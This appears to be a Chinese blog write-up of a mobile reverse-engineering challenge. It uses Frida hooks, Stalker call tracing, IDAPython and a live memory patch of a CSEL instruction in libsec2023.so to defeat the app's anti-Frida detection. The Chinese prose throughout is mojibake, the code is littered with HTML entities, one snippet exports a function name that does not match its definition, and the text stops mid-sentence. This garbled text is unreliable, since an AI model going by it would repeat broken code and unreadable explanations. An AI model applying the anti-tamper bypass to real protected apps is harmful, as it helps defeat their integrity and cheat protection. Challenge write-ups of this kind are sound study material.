å­˜å‚¨çš„æ˜¯å¯¼å…¥å‡½æ•° g_sec2023_p_array çš„åœ°å€ï¼Œè€Œ g_sec2023_p_array çš„å‡½æ•°å®šä¹‰åœ¨ libsec2023.so ä¸­ï¼Œ BR æŒ‡ä»¤æ˜¯æ— æ¡ä»¶å¯„å­˜å™¨è·³è½¬ï¼Œé‚£ä¹ˆè¿™å››è¡Œ arm æ±‡ç¼–çš„æ„ä¹‰å°±æ˜¯è°ƒç”¨ g_sec2023_p_array åç§» 0x48 å¤„çš„å‡½æ•° æ¥åˆ° libsec2023.so æˆ‘ä»¬å³å¯æ‰¾åˆ°ç›¸å¯¹åº”çš„å¯¼å‡ºå‡½æ•° sub_31164 é‚£ä¹ˆæ˜¾è€Œæ˜“è§ï¼Œå…³é”®çš„é€»è¾‘å°±åœ¨ libsec2023.so ä¸­çš„ sub_31164 äº† # è¿›å…¥ libsec2023.so åˆ†æ å¯¹ libsec2023.so çš„ sub_31164 hook ä¸€ä¸‹ function hook_sub_31164()&#123; // ç¨‹åºå…¥å£Java.perform(function() &#123; // è·å–æ¨¡å— var module = Process.getModuleByName(\"libsec2023.so\") // è½¬ä¸ºå‡½æ•°åœ°å€ var addr=module.base.add(\"0x31164\"); // è·å–å‡½æ•°å…¥å£ var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // å‡½æ•° hook é’©å­é™„åŠ  Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('hook success'); console.log(args[0]); console.log(args[1]); console.log(args[2]); &#125;, onLeave: function (retval) &#123; console.log(\"retvalue is :\", retval.toInt32()); console.log('method onleave'); &#125; &#125;);&#125;);&#125;rpc.exports = &#123; hook_sub_35404: hook_sub_35404&#125;ä½†æ˜¯å½“æˆ‘æ³¨å…¥å°†è¿™æ®µ frida ä»£ç æ³¨å…¥åˆ° libsec2023.so åï¼Œç¨‹åºåœ¨çŸ­æš‚çš„å»¶è¿Ÿåæ˜¾ç¤º hack detect åé€€å‡ºäº† æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ frida Stalker æ¥æŸ¥çœ‹è¿™ä¸ª so è°ƒç”¨å‡½æ•°çš„è¿‡ç¨‹ ä¸ºäº†ä½¿ç”¨ä¸Šçš„æ–¹ä¾¿ï¼Œæˆ‘å†™äº†ä¸€ä¸ª IDA æ’ä»¶æ¥å®ç°ä¸‹é¢çš„è¿‡ç¨‹ï¼Œæ’ä»¶åœ°å€:https://github.com/oacia/stalker_trace_soï¼Œè¿™åº”è¯¥ç®—æ˜¯æˆ‘ç¬¬ä¸€æ¬¡é€ è½®å­å§ï¼š) é¦–å…ˆä½¿ç”¨å¦‚ä¸‹ idaPython è„šæœ¬æ‰“å°å‡º libsec2023.so çš„æ‰€æœ‰å‡½æ•°çš„åœ°å€å’Œåç§° import idautilsimport idcfunc_addr = []func_name = []for i in idautils.Functions(): func_addr.append(i) func_name.append(idc.get_func_name(i))for i in func_addr: print(f\"&#123;hex(i)&#125;, \",end='')print('')for i in func_name: print(f\"\\\"&#123;i&#125;\\\", \",end='')å°†ä¸Šé¢ IDApython æ‰€æ‰“å°å‡ºçš„å†…å®¹å¡«å…¥ä¸‹é¢ frida ä»£ç çš„å˜é‡ func_addr å’Œ func_name ä¸­ var func_addr = [...]var func_name = [...]function hook_dlopen(soName = '') &#123; Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); if (path.indexOf(soName) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; //hook_sub_3530C(); var times = 1; var module = Process.getModuleByName(\"libsec2023.so\"); this.pid = Process.getCurrentThreadId(); console.log(\"start Stalker!\"); Stalker.follow(this.pid,&#123; events:&#123; call:false, ret:false, exec:false, block:false, compile:false &#125;, onReceive:function(events)&#123; &#125;, transform: function (iterator) &#123; var instruction = iterator.next(); do&#123; if (func_addr.indexOf(instruction.address - module.base) != -1)&#123; console.log(\"call\" + times+ \":\" + func_name[func_addr.indexOf(instruction.address - module.base)]) times=times+1 &#125; iterator.keep(); &#125; while ((instruction = iterator.next()) !== null); &#125;, onCallSummary:function(summary)&#123; &#125; &#125;); console.log(\"Stalker end!\"); &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen, \"libsec2023.so\")æ‰“å¼€ apk å frida è¾“å‡ºå¦‚ä¸‹ call1:JNI_OnLoadcall2:sub_FF14call3:.memsetcall4:.vsnprintfcall5:.timecall6:.localtimecall7:.__android_log_printcall8:sub_10070call9:.fopencall10:sub_21000call11:.pthread_oncecall12:sub_21054call13:sub_412CCcall14:.malloccall15:sub_21098call16:sub_FABCcall17:sub_1010Ccall18:sub_10194call19:sub_11C4Ccall20:.pthread_mutex_initcall21:sub_103D0call22:sub_2BCA8call23:sub_125E4call24:sub_12660call25:sub_1CE70call26:sub_1CE34call27:sub_1C664call28:.pthread_mutex_lockcall29:.pthread_mutex_unlockcall30:.strlencall31:sub_125F0call32:sub_1D998call33:sub_2C67Ccall34:sub_2C40Ccall35:.__strlcpy_chkcall36:.__strlen_chkcall37:sub_11BC4call38:sub_2CCC0call39:sub_355F0call40:sub_35630call41:sub_356C4call42:sub_35700call43:sub_11DF0call44:sub_35870call45:sub_36940call46:sub_36B34call47:sub_36B9Ccall48:sub_36BC8call49:sub_36BF0call50:sub_36E00call51:sub_36E70call52:sub_36ED0call53:sub_36F00call54:sub_36F3Ccall55:nullsub_17call56:sub_36C8Ccall57:sub_36CB8call58:sub_2E318call59:sub_2E288call60:sub_2D590call61:sub_1F450call62:sub_20FD0call63:.fstatcall64:sub_2DB5Ccall65:sub_1FE3Ccall66:sub_1FB70call67:.sscanfcall68:sub_200C0call69:.memcpycall70:sub_1F6C0call71:sub_1F8A4call72:.freecall73:sub_36D38call74:sub_36D70call75:sub_36DA4call76:sub_37060call77:sub_41368call78:sub_36A20call79:sub_36D10call80:sub_3C6A4call81:sub_369B0call82:sub_3DF74call83:sub_3A054call84:sub_3A090call85:sub_3A0FCcall86:sub_3A138call87:sub_24364call88:sub_3852Ccall89:sub_38D9Ccall90:sub_36A90call91:sub_3F2B0call92:sub_36120call93:sub_36144call94:sub_370ACcall95:sub_36558call96:sub_21BACcall97:sub_21C20call98:sub_21F50call99:sub_21DB4call100:j_.pthread_mutex_lockcall101:j_.pthread_mutex_unlockcall102:sub_11E30call103:sub_11C60call104:.pthread_attr_initcall105:.pthread_attr_setstacksizecall106:.pthread_attr_setdetachstatecall107:.pthread_createcall108:.pthread_attr_destroycall109:sub_11C6Ccall110:j_j_.free_2call111:j_.freecall112:sub_37254call113:sub_37740call114:sub_377A8call115:sub_377D8call116:sub_37804call117:sub_37A64call118:sub_37AD4call119:sub_37B34call120:sub_37B64call121:sub_37BA0call122:nullsub_18call123:sub_3789Ccall124:sub_378C4call125:sub_20DD0call126:sub_20580call127:sub_20CB0call128:sub_20EBCcall129:j_.statcall130:.statcall131:sub_373B4call132:sub_1240Ccall133:sub_1F74Ccall134:.lseekcall135:sub_1F9ECcall136:sub_1FA34call137:sub_37940call138:sub_37974call139:sub_379A8call140:sub_1235Ccall141:sub_37134call142:sub_37184call143:sub_371ACcall144:sub_376CCcall145:sub_37704call146:sub_37738call147:sub_3715Ccall148:sub_36580call149:sub_36538call150:sub_36178...# å¯¹ libsec2023.so æ‰“ä¸‹ç¡¬ä»¶æ–­ç‚¹ è¿™é‡Œéœ€è¦ç”¨åˆ°çš„å·¥å…·æ˜¯ rwprocmem33 , å…·ä½“çš„ç¼–è¯‘å’Œä½¿ç”¨å¯ä»¥ç§»æ­¥æˆ‘åšå®¢å†…çš„è¿™ç¯‡æ–‡ç« è¿›è¡Œé˜…è¯»ï¼Œè¿™é‡Œä¸åœ¨è¿‡å¤šèµ˜è¿° è¿è¡Œä¸‹é¢çš„ frida ä»£ç è·å– libsec2023.so çš„åŸºå€ function dump_so(so_name) &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var dir = currentApplication.getApplicationContext().getFilesDir().getPath(); var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); &#125;);&#125;rpc.exports = &#123; dump_so: dump_so&#125;;frida -H 127.0.0.1:1234 -l \"D:\\frida\\sec2023\\get_so_base.js\" -f \"com.com.sec2023.rocketmouse.mouse\" åˆ©ç”¨ä¸‹é¢çš„å‘½ä»¤è·å–è¿›ç¨‹çš„ PID ps -A | grep mouseå°†å¾—åˆ°çš„å‚æ•°å¡«å…¥ rwprocmem33 ä¸­ é¦–å…ˆå¯¹æˆ‘ä»¬æœ€æ„Ÿå…´è¶£çš„ libil2cpp.so è°ƒç”¨çš„ libsec2023.so çš„å¯¼å‡ºå‡½æ•° sub_35404 ä¸‹ç¡¬ä»¶æ–­ç‚¹çœ‹çœ‹ï¼Œæ¯•ç«Ÿä¹‹å‰æˆ‘ä»¬ç”¨ frida å» hook è¿™ä¸ªå‡½æ•°å¤±è´¥äº†å˜›ï¼Œç¡¬ä»¶æ–­ç‚¹ä¸‹çš„ä½ç½®å¯ä»¥é€šè¿‡åŸºå€ (base)+ åç§» (func offset) å¾—åˆ° ç»“æœå¦‚ä¸‹ ä»…ä»…ä¸‹äº†äº”ç§’çš„ç¡¬ä»¶æ–­ç‚¹ï¼Œç›¸åŒåœ°å€çš„å‘½ä¸­æ¬¡æ•°è¿›å…¥è¾¾åˆ°äº†ç™¾ä¸‡æ¬¡ æˆ‘ä»¬å†å¯¹ä¸åŒçš„åœ°å€æ‰“ä¸‹ç¡¬ä»¶æ–­ç‚¹çœ‹çœ‹ï¼Œå‘ç°å‡åªæœ‰ä¸€ä¸ªå‘½ä¸­åœ°å€ï¼Œå¹¶ä¸”å‘½ä¸­æ¬¡æ•°éƒ½è¾¾åˆ°ç™¾ä¸‡æ¬¡ ä¸åŸºå€ç›¸å‡å¾—åˆ°åç§»ä¸º 0x37704 è¿›å…¥ ida æŸ¥çœ‹ sub_37704 å‡½æ•°ï¼Œä»£ç å¾ˆçŸ­ï¼ŒæŒ‰ä¸‹äº¤å‰å¼•ç”¨ä¹Ÿæ²¡æœ‰è¾“å‡º è¿™è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ è¿˜è®°å¾—ä¸Šé¢æˆ‘ä»¬æ›¾ç”¨ frida-stalker æ‰“å°å‡ºäº† libsec2023.so å‡½æ•°çš„è°ƒç”¨é“¾å˜›ï¼Œæˆ‘ä»¬ä» sub_37704 å‘ä¸Šå›æº¯çœ‹çœ‹ call135:sub_1F9ECcall136:sub_1FA34call137:sub_37940call138:sub_37974call139:sub_379A8call140:sub_1235Ccall141:sub_37134call142:sub_37184call143:sub_371ACcall144:sub_376CCcall145:sub_37704sub_37704 æ˜¯è¢« sub_376CC è°ƒç”¨çš„ï¼Œ sub_376CC ä¸­çš„è¿™ä¸ª BR è·³è½¬åº”è¯¥æ˜¯è°ƒç”¨äº† sub_37704 å†çœ‹è°ƒç”¨ sub_376CC çš„å‡½æ•° sub_371AC , åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€æ¡æœ‰è¶£çš„æŒ‡ä»¤ï¼Œ CSEL ç†Ÿæ‚‰ arm æŒ‡ä»¤é›†çš„æœ‹å‹è‚¯å®šçŸ¥é“ï¼Œ CSEL æ˜¯ arm ä¸­çš„åˆ†æ”¯ç»“æ„æŒ‡ä»¤ï¼Œè€Œ BR è·³è½¬çš„ä½ç½®ç”± X8 å†³å®šï¼Œæ‰€ä»¥è¿™æ®µæ±‡ç¼–ä¾¿å¯ä»¥æ”¹å˜ä¾¿ç¨‹åºæ§åˆ¶æµ CSEL X8, X8, X9, EQ ä¸­ï¼Œ EQ è¡¨ç¤º Equal , å³ç›¸ç­‰æ¡ä»¶ï¼Œå…¶å€¼ç”±æœ€è¿‘çš„ CMP çš„æ¯”è¾ƒåå¾—å‡ºçš„å€¼å†³å®šï¼Œä¾‹å¦‚æ­¤å¤„åˆ¤æ–­çš„æ¡ä»¶å°±æ˜¯ CMP W0, W8 ç”¨ c è¯­è¨€æ¥è¡¨ç¤ºå°±æ˜¯ if(W0 == W8)&#123; X8 = X8&#125;else&#123; X8 = X9&#125;è€Œ X8 å’Œ X9 ç›¸å·® 0x10 , X8 çš„ä¿®æ”¹ä¾¿å¯¼è‡´äº†æ§åˆ¶æµçš„æ”¹å˜ ä¸ºäº†ä¸è®©æ§åˆ¶æµè½¬å‘é”™è¯¯çš„åˆ†æ”¯å¯¼è‡´ frida æ³¨å…¥åå¼ºåˆ¶é€€å‡ºï¼Œæˆ‘ä»¬å¯ä»¥å¯¹æ­¤å¤„çš„æ±‡ç¼–è¿›è¡Œ patch, å°† CSEL X8, X8, X9, EQ æ”¹ä¸º CSEL X8, X8, X8, EQ , å³å°†æ±‡ç¼– 08 01 89 9A ä¿®æ”¹ä¸º 08 01 88 9A ä½†æ˜¯è¦æ€ä¹ˆè®© apk è¿è¡Œæˆ‘ä»¬ patch è¿‡åçš„ libsec2023.so å‘¢ï¼Ÿ æœ‰ä»¥ä¸‹çš„ä¸‰ç§æ€è·¯å¯ä»¥å‚è€ƒ åç¼–è¯‘ apk ç„¶åæ›¿æ¢å…¶ä¸­çš„ lib/arm64-v8a/libsec2023.so å¹¶å›ç¼–è¯‘åå®‰è£… apk åœ¨æ‰‹æœºå®‰è£… apk åï¼Œåœ¨ /data/app/ å­ç›®å½•ä¸­æ‰¾åˆ° libsec2023.so çš„ä½ç½®å¹¶äºˆä»¥æ›¿æ¢ åœ¨ apk åŠ è½½ libsec2023.so ä¹‹åè¿›è¡Œ patch å‰ä¸¤ç§æ–¹æ³•ç»è¿‡å°è¯•å‡ä»¥å¤±è´¥å‘Šç»ˆï¼Œé‚£ä¹ˆç°åœ¨åªå‰©ä¸‹æœ€åä¸€ç§æ–¹æ³•äº†ï¼Œå°±æ˜¯åœ¨ libsec2023.so åŠ è½½ä¹‹ååŠ¨æ€ patch, è€Œè¿™åˆ©ç”¨ frida å¯ä»¥è¯´ç®€ç›´å°±æ˜¯è½»è€Œæ˜“ä¸¾ï¼Œåˆ©ç”¨ Memory.writeByteArray å°±å¯ä»¥åšåˆ° è¿è¡Œ rpc.exports.anti_sec2023() çš„æ—¶æœºæ˜¯åœ¨æ‰“å¼€ apk ä¹‹å function anti_sec2023() &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var libso = Process.getModuleByName(\"libsec2023.so\"); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); Memory.protect(ptr(libso.base), libso.size, 'rwx'); Memory.writeByteArray(ptr(libso.base).add(0x371DC),[0x08,0x01,0x88,0x9A]); &#125;);&#125;rpc.exports = &#123; anti_sec2023: anti_sec2023&#125;;ä¹‹åå†æ¬¡å°è¯•å¯¹ sub_31164 é™„åŠ é’©å­ function hook_31164()&#123; // ç¨‹åºå…¥å£Java.perform(function() &#123; // è·å–æ¨¡å— var module = Process.getModuleByName(\"libsec2023.so\") // è½¬ä¸ºå‡½æ•°åœ°å€ var addr=module.base.add(\"0x31164\"); // è·å–å‡½æ•°å…¥å£ var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // å‡½æ•° hook é’©å­é™„åŠ  Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('hook success'); console.log(args[0]); console.log(args[1]); console.log(args[2]); &#125;, onLeave: function (retval) &#123; console.log(\"retvalue is :\", retval.toInt32()); console.log('method onleave'); &#125; &#125;);&#125;);&#125;è¿™ä¸€æ¬¡ï¼Œé’©å­æˆåŠŸé™„åŠ ä¸Šå»äº†ï¼ # IDApython å»é™¤ CSEL-BR/CSET-BR ç»“æ„ sub_31164 é¦–å…ˆè°ƒç”¨äº† sub_3B8CC , é‚£æˆ‘ä»¬å°±å°±å»åˆ†æä¸€ä¸‹ sub_3B8CC å¾€ä¸‹çœ‹æœ€åä¸€è¡Œæ±‡ç¼–æ˜¯æ˜¯ BR X8 , æˆ‘ä»¬çœ‹çœ‹ BR è¡¨ç¤ºçš„æ„æ€æ˜¯ä»€ä¹ˆ BR: è·³è½¬åˆ°æŸå¯„å­˜å™¨ (çš„å€¼) æŒ‡å‘çš„åœ°å€ï¼ˆæ— è¿”å›ï¼‰, ä¸ä¼šæ”¹å˜ lr (x30) å¯„å­˜å™¨çš„å€¼ã€‚ å¯„å­˜å™¨è·³è½¬çš„å­˜åœ¨ä¸¥é‡çš„é˜»ç¢äº†æˆ‘ä»¬çš„é€†å‘åˆ†æï¼Œé‚£æˆ‘ä»¬è¯•è¯•èƒ½ä¸èƒ½ç¨ç¨ä¿®æ”¹ä¸€ä¸‹ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ frida-stalker æ¥è¿½è¸ªå¯„å­˜å™¨çš„å€¼ (ç»å¯¹ä¸æ˜¯å› ä¸ºæˆ‘ç”¨ä¸æ¥ unicorn æ‰ç”¨ frida çš„ (çœŸçš„) èµ·åˆæˆ‘æ˜¯ç›´æ¥å‡†å¤‡ patch å†…å­˜ä¸­çš„æŒ‡ä»¤çš„ï¼Œä»£ç ä¹Ÿå†™çš„å·®ä¸å¤šäº† (ç°åœ¨è¢«æ³¨é‡Šäº†), æ²¡æƒ³åˆ°è¿™å¯„å­˜å™¨è·³è½¬ä¼šæœ‰ä¸¤ç§æƒ…å†µï¼Œæ²¡åŠæ³•æ”¹æˆ B è·³è½¬ï¼Œä¸ç„¶è¿›ç¨‹ä¼šå´©æºƒæ‰ï¼Œæ‰€ä»¥å°±æ‰“å°å‡ºè·³è½¬çš„åœ°å€æ‰‹å·¥åˆ†æå’¯ function addr_locate_so(addr)&#123;// å®šä½æŸä¸ªå†…å­˜åœ°å€åœ¨å“ªä¸ª so é‡Œé¢ï¼Œè™½ç„¶å¯ä»¥ç›´æ¥ Process.getModuleByAddress, ä½†æ˜¯ä¼šæŠ›å‡ºå¼‚å¸¸æ‰€ä»¥å°±ç”¨å‡½æ•°å®ç°äº† var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; return process_Obj_Module_Arr[i].name+\":0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16) &#125; &#125;&#125;function anti_BR()&#123; var libso = Process.getModuleByName(\"libsec2023.so\") var hook_addr = new NativePointer(libso.base.add(0x31164).toString()); this.tid = Process.getCurrentThreadId(); console.log('[+] hook '+hook_addr.toString()) var reg_name;//br ä¹‹åçš„å¯„å­˜å™¨çš„åç§° var inst_addr; Interceptor.attach(hook_addr, &#123; onEnter: function (args) &#123; console.log(\"start Stalker!\"); // ä¸è¿½è¸ª libc.so, ä¸ç„¶ frida ä¼šæŠ¥é”™é€€å‡º.. çœ‹å †æ ˆå›æº¯åº”è¯¥æ˜¯åŠ¨æ€ç¼–è¯‘æ‰§è¡Œäº† libc.so é‡Œé¢çš„ ptrace æ‰å¯¼è‡´çš„å¼‚å¸¸ Stalker.exclude(&#123; \"base\": Process.getModuleByName(\"libc.so\").base, \"size\": Process.getModuleByName(\"libc.so\").size &#125;) Stalker.follow(this.tid, &#123; events: &#123; call: true, // CALL instructions: yes please ret: false, // RET instructions exec: false, // all instructions: not recommended as it's block: false, // block executed: coarse execution trace compile: false // block compiled: useful for coverage &#125;, transform: (iterator) => &#123; let instruction = iterator.next(); const startAddress = instruction.address; const isAppCode = startAddress.compare(libso.base) >= 0 &amp;&amp;startAddress.compare(libso.base.add(libso.size)) === -1; do &#123; if (isAppCode) &#123; if (instruction.mnemonic === \"br\") &#123; reg_name = instruction.opStr; inst_addr = new NativePointer(instruction.address); iterator.putCallout((context) => &#123; var addr_before = addr_locate_so(inst_addr); var addr_after = addr_locate_so(parseInt(context[reg_name],16)); if(addr_after==undefined)&#123; addr_after = \"unknown:\"+context[reg_name]; &#125; console.log(addr_before,\"jump to\",addr_after,\" \",reg_name); //Memory.patchCode(inst_addr,4,code =>&#123; //var cw = new Arm64Writer(code,&#123;pc: inst_addr&#125;); //cw.putBImm(new NativePointer(context[reg_name])); //cw.flush(); //&#125;) &#125;); &#125; &#125; iterator.keep(); &#125; while ((instruction = iterator.next()) !== null); &#125; &#125;) console.log(\"stalker end!\"); &#125;, onLeave: function (retval) &#123; Stalker.unfollow(this.tid); Stalker.garbageCollect(); &#125; &#125;); &#125;è¿è¡Œä»£ç åï¼Œç¨‹åºè¾“å‡ºå¦‚ä¸‹ [Remote::com.com.sec2023.rocketmouse.mouse ]-> rpc.exports.anti_BR()[+] hook 0x76cd136164[Remote::com.com.sec2023.rocketmouse.mouse ]-> start Stalker!stalker end!libsec2023.so:0x3ba00 jump to libsec2023.so:0x3ba04 x10libsec2023.so:0x3ba30 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba34 x12libsec2023.so:0x3ba70 jump to libsec2023.so:0x3ba74 x12libsec2023.so:0x3badc jump to libsec2023.so:0x3bae0 x13libsec2023.so:0x3bb28 jump to libsec2023.so:0x3bae0 x13libsec2023.so:0x3bb28 jump to libsec2023.so:0x3bae0 x13libsec2023.so:0x3bb28 jump to libsec2023.so:0x3bae0 x13libsec2023.so:0x3bb28 jump to libsec2023.so:0x3bb2c x13libsec2023.so:0x3bb4c jump to libsec2023.so:0x3ba04 x10libsec2023.so:0x3bb4c jump to unknown:0x3 x10libsec2023.so:0x3bb4c jump to unknown:0x2 x10libsec2023.so:0x3bb4c jump to unknown:0x1 x10libsec2023.so:0x3bb4c jump to unknown:0x0 x10libsec2023.so:0x3bb4c jump to unknown:0xffffffffffffffff x10libsec2023.so:0x3bb4c jump to unknown:0x0 x10libsec2023.so:0x3bb4c jump to unknown:0x6d000000 x10libsec2023.so:0x3bb4c jump to unknown:0x6d940000 x10libsec2023.so:0x3bb4c jump to unknown:0x6d94ca00 x10libsec2023.so:0x3bb4c jump to unknown:0x6d94cae5 x10libsec2023.so:0x3bb4c jump to libsec2023.so:0x3bb50 x10libsec2023.so:0x3a08c jump to libsec2023.so:0x3a0f0 x8libsec2023.so:0x3b508 jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b50c x11libsec2023.so:0x3b54c jump to libsec2023.so:0x3b550 x11libsec2023.so:0x3b5c0 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b5c4 x11libsec2023.so:0x3b604 jump to libsec2023.so:0x3b608 x11libsec2023.so:0x3aa70 jump to libsec2023.so:0x3aa74 x8libsec2023.so:0x3aaa0 jump to libsec2023.so:0x3aaa4 x8libsec2023.so:0x3aad4 jump to libsec2023.so:0x3aad8 x8libsec2023.so:0x3ab04 jump to libsec2023.so:0x3ab70 x8libsec2023.so:0xf28c jump to libc.so:0xb2688 x17libsec2023.so:0xf4ac jump to libc.so:0xb2bd8 x17libsec2023.so:0x3ac90 jump to libsec2023.so:0x3acc0 x11libsec2023.so:0xf40c jump to libc.so:0x4bc20 x17libsec2023.so:0xf40c jump to libc.so:0xb2688 x17libsec2023.so:0xf40c jump to libc.so:0xb2bd8 x17libsec2023.so:0x3b950 jump to libsec2023.so:0x3b95c x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3a0f0 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to unknown:0x76ccc36000 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3aa74 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3aaa4 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3aad8 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3ab70 x8libsec2023.so:0x3b950 jump to libsec2023.so:0x3ab70 x8libsec2023.so:0x3b950 jump to unknown:0x77ea7ac3a0 x8libsec2023.so:0x3b950 jump to unknown:0x1c01f8026ad23c58 x8libsec2023.so:0x3b950 jump to unknown:0x1c01f8026ad23c58 x8libsec2023.so:0x3b950 jump to unknown:0x1c01f8026ad23c58 x8libsec2023.so:0x3b950 jump to unknown:0xe x8libsec2023.so:0x3b990 jump to libsec2023.so:0x3b99c x8libsec2023.so:0x311a0 jump to libil2cpp.so:0x13b8d64 x2æˆ‘ä»¬ä¸å¦¨ä»¥åœ°å€ 0x3ba70 ä½œä¸ºåˆ†æçš„ç¤ºä¾‹ï¼Œè¿™é‡Œæˆ‘ä»¬å‘ç° 0x3ba70 ä¼šè·³è½¬çš„åœ°å€æœ‰ä¸¤ç§æƒ…å†µï¼Œåˆ†åˆ«æ˜¯ 0x3ba34 å’Œ 0x3ba74 ç­‰ç­‰ï¼Œ 0x3ba74 ?? è¿™ä¸å°±æ˜¯ 0x3ba70 